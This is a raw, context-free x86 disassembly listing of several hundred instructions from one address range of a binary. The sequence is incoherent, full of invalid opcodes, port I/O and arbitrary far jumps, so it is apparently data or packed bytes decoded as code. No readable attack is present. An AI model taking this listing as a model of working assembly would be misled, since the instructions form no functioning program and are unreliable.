  416939:	xchg   esi,eax
  41693a:	dec    ebp
  41693b:	xor    ebp,DWORD PTR [esi+0x13]
  41693e:	and    eax,DWORD PTR [ebx]
  416940:	mov    esi,0x323438ac
  416945:	mov    ecx,DWORD PTR es:[edx-0x1e66e65a]
  41694c:	xchg   edi,eax
  41694d:	ret    
  41694e:	std    
  41694f:	loope  0x416957
  416951:	mul    DWORD PTR [esi]
  416953:	pop    esp
  416954:	ds add edi,ebx
  416957:	push   esi
  416958:	mov    ds:0xa15f2107,eax
  41695d:	in     al,dx
  41695e:	sbb    BYTE PTR [eax-0x30],ah
  416961:	rcl    DWORD PTR [ecx-0x4d],cl
  416964:	add    al,0x88
  416966:	aad    0xfa
  416968:	xchg   BYTE PTR ds:[ebx-0x3e39b3dd],bl
  41696f:	pop    ds
  416970:	jno    0x416991
  416972:	xchg   edx,eax
  416973:	aas    
  416974:	leave  
  416975:	pop    ds
  416976:	(bad)  
  416977:	xchg   edi,eax
  416978:	push   edi
  416979:	enter  0x1eee,0xa9
  41697d:	mov    dl,0xf
  41697f:	prefetch BYTE PTR [eax+ecx*8-0x4e68d539]
  416987:	test   DWORD PTR [ecx+edx*8-0x4a17f969],ecx
  41698e:	adc    eax,0x8b5505bd
  416993:	sub    eax,DWORD PTR [ecx+ebp*8]
  416996:	xchg   ecx,eax
  416997:	enter  0x7fcc,0x4e
  41699b:	mov    ds:0x25488803,al
  4169a0:	out    dx,eax
  4169a1:	xchg   BYTE PTR [ecx+0x21e51bbb],bh
  4169a7:	push   ss
  4169a8:	int3   
  4169a9:	adc    al,BYTE PTR [edi]
  4169ab:	push   eax
  4169ac:	mov    ds:0x7c505e89,eax
  4169b1:	addr16 mov edx,cs
  4169b4:	iret   
  4169b5:	mov    bh,0xce
  4169b7:	cmp    al,0x88
  4169b9:	mov    ch,0x19
  4169bb:	jp     0x416965
  4169bd:	ret    0xbbf3
  4169c0:	mov    eax,0x9c72152d
  4169c5:	int    0x32
  4169c7:	jl     0x416a37
  4169c9:	sbb    bl,BYTE PTR [eax+0x1dc6bab8]
  4169cf:	jmp    0x4169f7
  4169d1:	pop    edx
  4169d2:	leave  
  4169d3:	or     dh,BYTE PTR [ecx+ecx*8+0x28]
  4169d7:	nop
  4169d8:	sbb    dh,ah
  4169da:	stos   BYTE PTR es:[edi],al
  4169db:	push   eax
  4169dc:	data16 add BYTE PTR [ebp+eiz*1-0x5d],dh
  4169e1:	inc    edx
  4169e2:	xor    esi,DWORD PTR ds:0x2df9946d
  4169e8:	cmp    ebx,DWORD PTR [edi+0x39]
  4169eb:	scas   al,BYTE PTR es:[edi]
  4169ec:	sub    DWORD PTR [edx+edx*4+0x12],eax
  4169f0:	sti    
  4169f1:	jns    0x416980
  4169f3:	ins    DWORD PTR es:[edi],dx
  4169f4:	outs   dx,DWORD PTR ds:[esi]
  4169f5:	xor    al,0x51
  4169f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169f8:	dec    ebp
  4169f9:	cmp    cl,BYTE PTR [edx]
  4169fb:	push   eax
  4169fc:	jl     0x416a70
  4169fe:	stc    
  4169ff:	jns    0x4169dc
  416a01:	push   es
  416a02:	inc    ebp
  416a03:	and    al,0xde
  416a05:	(bad)  
  416a07:	arpl   WORD PTR [eax+ecx*4-0x75f02b9f],cx
  416a0e:	fdivr  QWORD PTR [edx+0x6aed44d9]
  416a14:	push   esi
  416a15:	xchg   esp,eax
  416a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a17:	add    BYTE PTR [edi-0x58045754],0x33
  416a1e:	jge    0x416a59
  416a20:	je     0x416a0b
  416a22:	push   ebx
  416a23:	mov    edx,0xffb343b6
  416a28:	or     DWORD PTR [edi+0x19],eax
  416a2b:	cld    
  416a2c:	outs   dx,DWORD PTR ds:[esi]
  416a2d:	inc    ebx
  416a2e:	je     0x416aa8
  416a30:	imul   edi,DWORD PTR [ecx],0x769fa6a5
  416a36:	imul   ebx,DWORD PTR [edi],0xffffffd7
  416a39:	jae    0x4169e3
  416a3b:	or     esp,esp
  416a3d:	adc    eax,0xec2c0b44
  416a42:	arpl   WORD PTR [ecx],bp
  416a44:	ss push edi
  416a46:	mov    ebx,0x490d66b1
  416a4b:	cmp    al,0x33
  416a4d:	lea    ebp,[edi+0x140fd293]
  416a53:	arpl   bp,dx
  416a55:	js     0x416aa4
  416a57:	call   0xfbc53765
  416a5c:	jmp    FWORD PTR [ecx-0xbac8e5]
  416a62:	and    DWORD PTR [esi],edx
  416a64:	fild   WORD PTR [ebx+0x23fac961]
  416a6a:	pop    eax
  416a6b:	mov    dh,0x42
  416a6d:	mov    ebx,0x6bcbb528
  416a72:	dec    ebx
  416a73:	aam    0xfb
  416a75:	das    
  416a76:	xchg   edi,eax
  416a77:	in     eax,dx
  416a78:	nop
  416a79:	cmp    DWORD PTR [ebx-0x74],ebp
  416a7c:	shr    esi,cl
  416a7e:	not    DWORD PTR [ebp+0x6b351d3a]
  416a84:	mov    dl,0x54
  416a86:	out    dx,eax
  416a87:	or     ch,bl
  416a89:	lock xor eax,0x89f60a0f
  416a8f:	cmp    cl,ch
  416a91:	cmc    
  416a92:	add    ch,BYTE PTR [ebp-0x3e48166f]
  416a98:	sbb    BYTE PTR [ecx+0x52028ccb],dh
  416a9e:	cdq    
  416a9f:	and    dh,BYTE PTR [edx+0x64224c74]
  416aa5:	mov    esi,edx
  416aa7:	push   0x75f4196f
  416aac:	lahf   
  416aad:	adc    DWORD PTR [esi+ecx*1],edx
  416ab0:	sbb    dl,bl
  416ab2:	popf   
  416ab3:	jo     0x416aca
  416ab5:	or     al,0xee
  416ab7:	sbb    al,0x1
  416ab9:	pop    edx
  416aba:	pop    edi
  416abb:	inc    edi
  416abc:	jl     0x416aa3
  416abe:	xchg   ebx,eax
  416abf:	nop
  416ac0:	sub    al,0xbc
  416ac2:	pop    ss
  416ac3:	sub    ebx,DWORD PTR [eax+0x7d]
  416ac6:	cdq    
  416ac7:	or     esi,DWORD PTR [ebp+0x9]
  416aca:	cmc    
  416acb:	cmp    ebp,DWORD PTR [eax+0x3e]
  416ace:	pop    ds
  416acf:	jmp    DWORD PTR [ecx+0xed8fa16]
  416ad5:	dec    edx
  416ad6:	fxch   st(6)
  416ad8:	div    DWORD PTR [edi]
  416ada:	dec    ebp
  416adb:	mov    eax,ds:0xa2c9a75a
  416ae0:	imul   ebp,DWORD PTR [edx-0x4e],0x70c161fe
  416ae7:	cmp    ebp,DWORD PTR [eax-0x26bae4cc]
  416aed:	icebp  
  416aee:	pop    edx
  416aef:	xor    esi,eax
  416af1:	aaa    
  416af2:	fwait
  416af3:	inc    edi
  416af4:	and    DWORD PTR [edi+0x6047a486],0xffffffa8
  416afb:	sar    BYTE PTR [ecx-0x18],0x11
  416aff:	lock fwait
  416b01:	ins    BYTE PTR es:[edi],dx
  416b02:	pushf  
  416b03:	mov    al,ds:0x5c437025
  416b08:	and    ebx,esp
  416b0a:	jo     0x416af9
  416b0c:	pop    eax
  416b0d:	fisttp DWORD PTR [edi]
  416b0f:	popf   
  416b10:	jle    0x416b3f
  416b12:	sub    eax,0xc4389580
  416b17:	and    al,0x8c
  416b19:	mov    ebp,0x3c0f48c4
  416b1e:	sub    edx,ebx
  416b20:	clc    
  416b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b22:	test   al,0xab
  416b24:	adc    al,ch
  416b26:	ds call 0xedf1a4c7
  416b2c:	mov    eax,ds:0x90bd122e
  416b31:	fidivr WORD PTR ds:0x2477a68
  416b37:	int    0x66
  416b39:	sbb    edi,DWORD PTR ds:0xa6fab198
  416b3f:	stc    
  416b40:	xchg   esp,eax
  416b41:	push   esp
  416b42:	adc    al,0xff
  416b44:	in     al,dx
  416b45:	push   cs
  416b46:	and    bh,BYTE PTR [ecx+0x75599fef]
  416b4c:	xchg   DWORD PTR [ecx-0x1fcd3708],edi
  416b52:	and    dl,dh
  416b54:	pop    ebp
  416b55:	or     bl,ah
  416b57:	ds xor ebx,0xffffffa0
  416b5b:	sbb    edi,DWORD PTR [ebx-0x31]
  416b5e:	in     eax,dx
  416b5f:	int    0x48
  416b61:	adc    dh,BYTE PTR [edx]
  416b63:	push   0xcfb0ded9
  416b68:	aam    0x30
  416b6a:	sbb    DWORD PTR [eax+ebx*8-0x4d],eax
  416b6e:	jne    0x416b22
  416b70:	ret    0x404b
  416b73:	pop    edi
  416b74:	into   
  416b75:	(bad)  
  416b76:	arpl   WORD PTR [ebx+0x61],ax
  416b79:	(bad)  
  416b7a:	fucomip st,st(1)
  416b7c:	mov    cl,0x1d
  416b7e:	xlat   BYTE PTR ds:[ebx]
  416b7f:	sti    
  416b80:	cmp    dl,BYTE PTR [ecx+0x3f185191]
  416b86:	mov    edi,0xfef16d84
  416b8b:	repz adc ax,0x8e34
  416b90:	aam    0x8b
  416b92:	repz arpl di,bx
  416b95:	imul   ebp,DWORD PTR [edx-0x351484f8],0x505b626e
  416b9f:	ins    DWORD PTR es:[edi],dx
  416ba0:	outs   dx,BYTE PTR ds:[esi]
  416ba1:	into   
  416ba2:	out    0x82,eax
  416ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ba5:	or     DWORD PTR [ecx-0x5c73dc],edx
  416bab:	addr16 inc ebx
  416bad:	stos   BYTE PTR es:[edi],al
  416bae:	ja     0x416b64
  416bb0:	jl     0x416b33
  416bb2:	out    0x7b,al
  416bb4:	dec    esp
  416bb5:	jns    0x416bb8
  416bb7:	cmp    ecx,DWORD PTR ds:0x194c94b5
  416bbd:	inc    edx
  416bbe:	mov    ds:0x5e7dfba3,al
  416bc3:	in     eax,dx
  416bc4:	and    ecx,DWORD PTR [ebx-0x46]
  416bc7:	cwde   
  416bc8:	into   
  416bc9:	mov    edi,DWORD PTR [eax]
  416bcb:	test   DWORD PTR [edi-0x4a],esp
  416bce:	mov    edx,0x77a4dca6
  416bd3:	jmp    0x7a3c:0x3708f8ea
  416bda:	popf   
  416bdb:	xor    esi,edx
  416bdd:	pop    edx
  416bde:	into   
  416bdf:	and    DWORD PTR [edi],edi
  416be1:	sub    ecx,ebp
  416be3:	jnp    0x416c46
  416be5:	xchg   bh,ch
  416be7:	(bad)  
  416be8:	imul   ecx,eax,0xc6f9fa57
  416bee:	out    dx,al
  416bef:	or     bh,BYTE PTR [eax-0x68]
  416bf2:	xchg   ecx,eax
  416bf3:	rcl    BYTE PTR [ecx+0x2994d565],0xc4
  416bfa:	inc    eax
  416bfb:	jno    0x416c03
  416bfd:	icebp  
  416bfe:	sahf   
  416bff:	cmp    BYTE PTR [ebx+0x25],cl
  416c02:	fwait
  416c03:	adc    edx,DWORD PTR [ebx+edi*8]
  416c06:	(bad)  
  416c07:	lea    ebx,[edi-0x4c]
  416c0a:	sti    
  416c0b:	mov    esi,0x70ccba7d
  416c10:	mov    ebp,0x3a21f239
  416c15:	push   ss
  416c16:	jmp    0xa47e4112
  416c1b:	ins    BYTE PTR es:[edi],dx
  416c1c:	add    al,0x71
  416c1e:	dec    ebx
  416c1f:	sub    DWORD PTR [ecx-0xd],eax
  416c22:	mov    ds:0xe1ff261c,al
  416c27:	push   ebx
  416c28:	leave  
  416c29:	push   edi
  416c2a:	sub    eax,0x6a6dd259
  416c2f:	pushw  0x1a
  416c32:	mov    al,0x18
  416c34:	repz adc ch,ah
  416c37:	add    DWORD PTR [ebx],0xffffffb6
  416c3a:	inc    eax
  416c3b:	xchg   esi,eax
  416c3c:	es sub al,0x5
  416c3f:	sahf   
  416c40:	adc    BYTE PTR [eax],ah
  416c42:	ds lds ebp,FWORD PTR cs:[edx+0x57b36f33]
  416c4a:	and    DWORD PTR [ebp+0x3d],0x3548e76c
  416c51:	mov    ecx,0x12dc5b3e
  416c56:	sar    BYTE PTR [ebp-0x33],cl
  416c59:	jge    0x416c44
  416c5b:	mov    dl,al
  416c5d:	xor    edi,DWORD PTR [esp+edx*8]
  416c60:	push   ss
  416c61:	push   ecx
  416c62:	popf   
  416c63:	and    ebp,ebp
  416c65:	sub    eax,0xb28d373e
  416c6a:	aad    0xd3
  416c6c:	pop    ecx
  416c6d:	loop   0x416c10
  416c6f:	mov    es,WORD PTR [ebx+ecx*1]
  416c72:	xor    BYTE PTR [ebp-0x3b978269],dh
  416c78:	mov    ebp,DWORD PTR ds:0x52b9c72e
  416c7e:	hlt    
  416c7f:	jb     0x416c47
  416c81:	cli    
  416c82:	xlat   BYTE PTR ds:[ebx]
  416c83:	mov    eax,0x1a82378a
  416c88:	xchg   ebx,eax
  416c89:	clc    
  416c8a:	cmc    
  416c8b:	inc    esi
  416c8c:	adc    DWORD PTR [esp+ecx*4+0x15891839],0xffffffeb
  416c94:	inc    ecx
  416c95:	mov    ah,0x94
  416c97:	daa    
  416c98:	(bad)  
  416c99:	pop    esi
  416c9a:	mov    cl,0xd3
  416c9c:	imul   ecx,DWORD PTR [edi-0x25],0x1a099b77
  416ca3:	aad    0x82
  416ca5:	rcl    BYTE PTR [edi-0x442f97f3],1
  416cab:	out    dx,eax
  416cac:	in     al,0x29
  416cae:	enter  0x53f1,0x68
  416cb2:	xchg   edx,eax
  416cb3:	adc    BYTE PTR [ebp+eax*4+0x59e259de],cl
  416cba:	xor    BYTE PTR [ebp+0x3e],0x42
  416cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cbf:	mov    ds:0x8c88963e,eax
  416cc4:	xor    BYTE PTR [esi],ch
  416cc6:	inc    edi
  416cc7:	mov    BYTE PTR [edi],dh
  416cc9:	pop    ecx
  416cca:	jmp    0x5d650f17
  416ccf:	cwde   
  416cd0:	push   ebp
  416cd1:	cmp    eax,0x74ebdae
  416cd6:	aas    
  416cd7:	out    dx,al
  416cd8:	imul   ebp,DWORD PTR [ebx-0x3e3ad724],0x267d5e91
  416ce2:	ins    BYTE PTR es:[edi],dx
  416ce3:	dec    ebx
  416ce4:	stc    
  416ce5:	push   ss
  416ce6:	imul   ebp,DWORD PTR [esi+0x493b2391],0x72
  416ced:	mov    bl,0x91
  416cef:	push   cs
  416cf0:	out    0xea,eax
  416cf2:	mov    edx,0x7db6468c
  416cf7:	retf   
  416cf8:	mov    esp,0xe5d54da8
  416cfd:	(bad)  
  416cfe:	pop    ebp
  416cff:	popf   
  416d00:	pop    ds
  416d01:	add    ebp,DWORD PTR ss:[eax-0x70a6b70b]
  416d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d09:	dec    ebp
  416d0a:	add    al,0x1f
  416d0c:	or     al,cl
  416d0e:	xchg   ebp,eax
  416d0f:	lods   al,BYTE PTR ds:[esi]
  416d10:	sub    BYTE PTR [ecx-0x10],dl
  416d13:	pusha  
  416d14:	lds    esi,FWORD PTR [eax-0x2dc8bbc2]
  416d1a:	mov    edx,0xe944294e
  416d1f:	and    BYTE PTR [ebp+0x6e],cl
  416d22:	rol    BYTE PTR [ebx+0x17dc6d6a],1
  416d28:	or     eax,0x4cf15ca9
  416d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d2e:	jmp    0x584e:0xd8235cbd
  416d35:	push   ds
  416d36:	mov    ah,0xe6
  416d38:	mov    eax,ds:0xbd9cdebc
  416d3d:	sbb    esp,DWORD PTR ds:0x5ed4d500
  416d43:	nop
  416d44:	dec    ecx
  416d45:	mov    ebp,0x96b0c016
  416d4a:	mov    ds:0x29f33f9f,al
  416d4f:	xor    bl,al
  416d51:	shl    BYTE PTR [ecx+eax*8+0x64e60c44],0x3b
  416d59:	cmp    al,ch
  416d5b:	add    eax,0xd61fe7ab
  416d60:	add    ebp,DWORD PTR [edx-0x73]
  416d63:	cmc    
  416d64:	xor    al,0xf8
  416d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d67:	inc    esi
  416d68:	push   esi
  416d69:	mov    bl,0x25
  416d6b:	jp     0x416d76
  416d6d:	add    DWORD PTR [edi+edi*2-0x3c],ebp
  416d71:	nop
  416d72:	aaa    
  416d73:	out    dx,al
  416d74:	ss mov bl,0x90
  416d77:	stos   BYTE PTR es:[edi],al
  416d78:	mov    ch,0xf3
  416d7a:	and    ax,dx
  416d7d:	jo     0x416d82
  416d7f:	unpcklps xmm4,xmm2
  416d82:	lock enter 0x3a2e,0xd0
  416d87:	jbe    0x416db7
  416d89:	scas   eax,DWORD PTR es:[edi]
  416d8a:	xor    eax,0x3dcfee4e
  416d8f:	test   al,0x7a
  416d91:	retf   
  416d92:	and    BYTE PTR [ebx-0x344765ba],0x28
  416d99:	sar    esi,cl
  416d9b:	mov    eax,esp
  416d9d:	and    DWORD PTR [bp+0x47ff],eax
  416da2:	shr    DWORD PTR [eax-0x42],cl
  416da5:	repz call 0x56f4:0xb1becdf2
  416dad:	inc    edx
  416dae:	jmp    0x45ad:0x77b8fd72
  416db5:	jnp    0x416d5f
  416db7:	outs   dx,DWORD PTR ds:[esi]
  416db8:	ds mov ah,0x32
  416dbb:	jae    0x416db8
  416dbd:	stc    
  416dbe:	mov    eax,ds:0x40b6062e
  416dc3:	fwait
  416dc4:	mov    ebp,0xc8a32d05
  416dc9:	push   edi
  416dca:	scas   eax,DWORD PTR es:[edi]
  416dcb:	sti    
  416dcc:	pop    eax
  416dcd:	mov    ds:0x2bece8f3,al
  416dd2:	sti    
  416dd3:	dec    edx
  416dd4:	(bad)  
  416dd5:	or     BYTE PTR [ebx],al
  416dd7:	inc    edi
  416dd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dd9:	xchg   edx,eax
  416dda:	xchg   esp,eax
  416ddb:	push   ss
  416ddc:	and    bh,BYTE PTR [ebp-0x61]
  416ddf:	adc    eax,0xa7cd67a3
  416de4:	fdivp  st(1),st
  416de6:	and    bh,BYTE PTR [ecx+0x480b76d4]
  416dec:	hlt    
  416ded:	inc    ecx
  416dee:	mov    edx,DWORD PTR [ebp+edx*8+0x78]
  416df2:	sbb    BYTE PTR [edi-0x67],dh
  416df5:	and    BYTE PTR [esi+0x2a0934f2],bl
  416dfb:	mov    esi,DWORD PTR [esi+0x105c3664]
  416e01:	dec    ecx
  416e02:	inc    edx
  416e03:	pop    ss
  416e04:	cmp    BYTE PTR [ebp-0x79],bh
  416e07:	out    dx,eax
  416e08:	jmp    0x46d1:0x72fd493b
  416e0f:	push   cs
  416e10:	aaa    
  416e11:	outs   dx,DWORD PTR ds:[esi]
  416e12:	lea    ecx,[ebp-0x40029335]
  416e18:	pop    es
  416e19:	gs leave 
  416e1b:	inc    ebp
  416e1c:	and    eax,0xb8ca15a7
  416e21:	jp     0x416e62
  416e23:	icebp  
  416e24:	push   cs
  416e25:	aam    0x23
  416e27:	mov    ebp,0xdc064fdb
  416e2c:	adc    ebx,DWORD PTR [ecx+0x3b]
  416e2f:	cmp    eax,0x8974f751
  416e34:	(bad)  
  416e35:	push   ebx
  416e36:	popa   
  416e37:	rcr    edi,1
  416e39:	jo     0x416e48
  416e3b:	retf   0x7086
  416e3e:	push   ss
  416e3f:	adc    esi,0xffffffc9
  416e42:	inc    ebx
  416e43:	add    al,0x73
  416e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e46:	pop    esp
  416e47:	gs pop ebp
  416e49:	fnstcw WORD PTR [eax]
  416e4b:	into   
  416e4c:	call   0xd183:0x809be770
  416e53:	test   dl,al
  416e55:	es pop edx
  416e57:	in     eax,0xa0
  416e59:	(bad)  
  416e5a:	push   ss
  416e5b:	fmul   DWORD PTR ds:0x43abba35
  416e61:	jnp    0x416ed3
  416e63:	pop    eax
  416e64:	retf   0x70b7
  416e67:	adc    al,0xa3
  416e69:	in     eax,dx
  416e6a:	ret    
  416e6b:	xchg   esi,eax
  416e6c:	push   ss
  416e6d:	out    dx,eax
  416e6e:	or     eax,0xe269f7f4
  416e73:	xchg   ebp,eax
  416e74:	(bad)  
  416e75:	sub    al,0x3c
  416e77:	js     0x416ec5
  416e79:	es call 0x9e30:0x1c1eb171
  416e81:	lods   eax,DWORD PTR ds:[esi]
  416e82:	xchg   dl,cl
  416e84:	fistp  WORD PTR [eax+0x57]
  416e87:	mov    cs,WORD PTR [ebx+eiz*2-0xa1d3fc7]
  416e8e:	pop    edi
  416e8f:	mov    bl,BYTE PTR [eax]
  416e91:	mov    edi,0x311167d4
  416e96:	sub    esp,ecx
  416e98:	or     eax,0xa85c5147
  416e9d:	and    al,0x74
  416e9f:	int    0xb9
  416ea1:	(bad)  
  416ea3:	std    
  416ea4:	in     eax,dx
  416ea5:	fdiv   st,st(1)
  416ea7:	pop    ecx
  416ea8:	pusha  
  416ea9:	cdq    
  416eaa:	leavew 
  416eac:	test   cl,bl
  416eae:	aad    0x43
  416eb0:	jp     0x416e5f
  416eb2:	outs   dx,DWORD PTR ds:[esi]
  416eb3:	cmp    eax,DWORD PTR [eax]
  416eb5:	mov    dh,0xaf
  416eb7:	add    ebp,DWORD PTR [ebx]
  416eb9:	fist   DWORD PTR [esi+0x632369e0]
  416ebf:	lds    eax,FWORD PTR [esi-0x2a]
  416ec2:	sar    DWORD PTR [esi+ebp*1+0x33],0xa3
  416ec7:	jg     0x416eb2
  416ec9:	dec    edi
  416eca:	mov    cl,0xff
  416ecc:	ins    DWORD PTR es:[edi],dx
  416ecd:	not    DWORD PTR [eax-0x44]
  416ed0:	sti    
  416ed1:	jne    0x416f2d
  416ed3:	and    BYTE PTR [edx+0x2d9e32c2],0x9
  416eda:	pop    edx
  416edb:	repnz out 0x89,eax
  416ede:	xchg   esi,eax
  416edf:	dec    ecx
  416ee0:	jns    0x416e95
  416ee2:	lods   al,BYTE PTR ds:[esi]
  416ee3:	and    esp,DWORD PTR [eax-0x707394e9]
  416ee9:	pop    ds
  416eea:	gs and eax,0xad53d8e
  416ef0:	adc    BYTE PTR [ebx-0x60],dl
  416ef3:	and    eax,0xdf73082
  416ef8:	or     edi,DWORD PTR [ebp-0x55]
  416efb:	push   ds
  416efc:	(bad)  
  416efd:	mov    esp,0x43771d51
  416f02:	stos   BYTE PTR es:[edi],al
  416f03:	or     edi,DWORD PTR [ebp-0x72]
  416f06:	sar    BYTE PTR [ebp+0x670f0194],cl
  416f0c:	imul   edx,DWORD PTR [ecx+0x688f9de8],0xe624a4f6
  416f16:	pop    ecx
  416f17:	in     eax,dx
  416f18:	bnd jmp 0x2825cca5
  416f1e:	mov    bh,0x44
  416f20:	mov    ch,0x9f
  416f22:	stos   DWORD PTR es:[edi],eax
  416f23:	lods   al,BYTE PTR ds:[esi]
  416f24:	test   DWORD PTR [ebx+0x2e],ebp
  416f27:	sub    edi,DWORD PTR [eax-0xc41036b]
  416f2d:	ins    BYTE PTR es:[edi],dx
  416f2e:	test   al,0x15
  416f30:	or     dh,BYTE PTR [ebx-0x371bd254]
  416f36:	mov    DWORD PTR [esi-0x51e57c2b],0xa34fd391
  416f40:	in     eax,dx
  416f41:	call   0x9d5149f8
  416f46:	pop    es
  416f47:	outs   dx,BYTE PTR ds:[esi]
  416f48:	cmc    
  416f49:	adc    al,0x2f
  416f4b:	dec    ebp
  416f4c:	test   al,0xf3
  416f4e:	jns    0x416f0e
  416f50:	sub    dh,BYTE PTR [edi]
  416f52:	add    ecx,DWORD PTR [ebp-0x72]
  416f55:	aas    
  416f56:	jo     0xae6ac9fc
  416f5c:	sbb    ebx,DWORD PTR [edx]
  416f5e:	and    BYTE PTR [ecx-0xe],ah
  416f61:	scas   al,BYTE PTR es:[edi]
  416f62:	mov    esi,0x3b610a0e
  416f67:	jecxz  0x416fe5
  416f69:	inc    eax
  416f6a:	adc    al,0xf2
  416f6c:	bound  ebp,QWORD PTR [ecx+0x38]
  416f6f:	xor    DWORD PTR [ebx],ecx
  416f71:	ds retf 0x5961
  416f75:	fnsave cs:[eax-0xf]
  416f79:	leave  
  416f7a:	fcmovbe st,st(4)
  416f7c:	mov    esp,0x95d19768
  416f81:	fwait
  416f82:	data16 mov al,0x81
  416f85:	or     al,0xc3
  416f87:	ret    0xb203
  416f8a:	push   ebx
  416f8b:	inc    edx
  416f8c:	dec    ebp
  416f8d:	push   esp
  416f8e:	xchg   DWORD PTR [eax],ebp
  416f90:	repnz dec ebp
  416f92:	into   
  416f93:	adc    eax,0xd2fccd9e
  416f98:	shl    DWORD PTR [edx-0x6f],cl
  416f9b:	scas   al,BYTE PTR es:[edi]
  416f9c:	xlat   BYTE PTR ds:[ebx]
  416f9d:	jmp    0x416f5b
  416f9f:	jo     0x416f7f
  416fa1:	xchg   ebp,eax
  416fa2:	call   0x2d93:0x9185c38
  416fa9:	(bad)  
  416faa:	lahf   
  416fab:	lock adc BYTE PTR [edx+0x26a370f5],bl
  416fb2:	loop   0x416fdb
  416fb4:	loopne 0x416f3a
  416fb6:	retf   0x6159
  416fb9:	sbb    dh,ch
  416fbb:	and    al,BYTE PTR [edi-0x12]
  416fbe:	les    ecx,FWORD PTR [ebx-0x4b]
  416fc1:	js     0x416f89
  416fc3:	jg     0x417020
  416fc5:	adc    DWORD PTR [ecx-0x63],0x42
  416fc9:	add    bh,BYTE PTR [ebx+0x66507327]
  416fcf:	fdiv   DWORD PTR [edx]
  416fd1:	mov    ecx,DWORD PTR [edi+0x50]
  416fd4:	inc    ebp
  416fd5:	dec    ebp
  416fd6:	int3   
  416fd7:	ds mov bl,0x6a
  416fda:	scas   al,BYTE PTR es:[edi]
  416fdb:	into   
  416fdc:	inc    edi
  416fdd:	(bad)  
  416fde:	push   esp
  416fdf:	pop    ds
  416fe0:	repz push esi
  416fe2:	lods   eax,DWORD PTR ds:[esi]
  416fe3:	sub    dl,BYTE PTR [edi]
  416fe5:	outs   dx,BYTE PTR ds:[esi]
  416fe6:	and    eax,0xeed2f9d0
  416feb:	and    BYTE PTR [ebx],al
  416fed:	mov    WORD PTR [eax],gs
  416fef:	lods   ax,WORD PTR ds:[esi]
  416ff1:	psrlq  mm2,QWORD PTR [edx+ebp*4+0x25]
  416ff6:	mov    ds:0x3cefffcf,al
  416ffb:	pushf  
  416ffc:	push   edi
  416ffd:	inc    eax
  416ffe:	aaa    
  416fff:	cdq    
  417000:	dec    ebx
  417001:	gs inc ch
  417004:	lea    edx,[ebx+0x5a5bced2]
  41700a:	fucomp st(6)
  41700c:	inc    esi
  41700d:	ret    
  41700e:	xchg   ecx,eax
  41700f:	addr16 pop edi
  417011:	sti    
  417012:	ret    
  417013:	xor    ecx,DWORD PTR [ebx-0x35]
  417016:	das    
  417017:	push   0xffffffdb
  417019:	mov    edx,0x52291186
  41701e:	nop
  41701f:	icebp  
  417020:	sbb    al,0xc
  417022:	mov    ds:0x401ed462,eax
  417027:	clc    
  417028:	pusha  
  417029:	inc    ebp
  41702a:	les    ebp,FWORD PTR [ebp-0x2ca47ad9]
  417030:	dec    eax
  417031:	cmp    eax,0x9a7d3eb0
  417036:	mov    edx,0xc6cf5059
  41703b:	push   ss
  41703c:	pop    ebx
  41703d:	mov    ecx,0xa64cf182
  417042:	push   edi
  417043:	cld    
  417044:	iret   
  417045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417046:	loop   0x41709e
  417048:	add    ecx,DWORD PTR [edx-0x23]
  41704b:	mov    eax,ss:0xb80b0ce2
  417051:	jecxz  0x41704e
  417053:	inc    DWORD PTR [edx]
  417055:	fnstenv [edi+0x18]
  417058:	and    ebx,DWORD PTR [esi]
  41705a:	mov    eax,ds:0x3c4d56df
  41705f:	inc    BYTE PTR [esi+esi*8+0x67335c38]
  417066:	scas   eax,DWORD PTR es:[edi]
  417067:	or     al,0xf7
  417069:	cmp    BYTE PTR [ebp+0x29],dh
  41706c:	cdq    
  41706d:	lds    ebx,FWORD PTR [edx]
  41706f:	and    DWORD PTR [edi+0x9],eax
  417072:	dec    ebp
  417073:	adc    DWORD PTR fs:[ecx],edx
  417076:	(bad)  
  417077:	loope  0x417091
  417079:	(bad)
  41707c:	iret   
  41707d:	call   0x14d9:0x5d9bcf88
  417084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417085:	or     BYTE PTR [ecx+ecx*2],bl
  417088:	push   ss
  417089:	jns    0x417055
  41708b:	cmc    
  41708c:	xchg   ecx,eax
  41708d:	leave  
  41708e:	lods   al,BYTE PTR ss:[esi]
  417090:	dec    esp
  417091:	xchg   ebx,eax
  417092:	mov    al,0x26
  417094:	ret    
  417095:	add    DWORD PTR [edi+0x32201561],ebp
  41709b:	inc    eax
  41709c:	mov    eax,ds:0xa8d56ff3
  4170a1:	xchg   ebp,eax
  4170a2:	lahf   
  4170a3:	or     DWORD PTR [edx-0xe],edx
  4170a6:	pop    ss
  4170a7:	lea    ebp,ds:0xba9f44fb
  4170ad:	sub    BYTE PTR [ebx-0x399fc08d],ch
  4170b3:	push   ss
  4170b4:	add    si,sp
  4170b7:	inc    esp
  4170b8:	push   0x73b154c9
  4170bd:	in     eax,0x98
  4170bf:	mov    cl,0xf2
  4170c1:	das    
  4170c2:	inc    edx
  4170c3:	fwait
  4170c4:	cmp    DWORD PTR [ecx-0x1d4e404a],0xffffffec
  4170cb:	cmp    ecx,0xffffffef
  4170ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170cf:	into   
  4170d0:	(bad)  
  4170d1:	hlt    
  4170d2:	xor    dl,dh
  4170d4:	lods   eax,DWORD PTR ds:[esi]
  4170d5:	mov    edi,0x521be9db
  4170da:	dec    ecx
  4170db:	push   edx
  4170dc:	sub    al,0x55
  4170de:	pusha  
  4170df:	sbb    al,0x9
  4170e1:	jbe    0x4170bf
  4170e3:	push   esi
  4170e4:	xchg   esi,eax
  4170e5:	adc    eax,0x16614490
  4170ea:	jmp    0x1ffd:0x9b7ca14d
  4170f1:	int    0x89
  4170f3:	loopne 0x41709c
  4170f5:	xor    al,0x6c
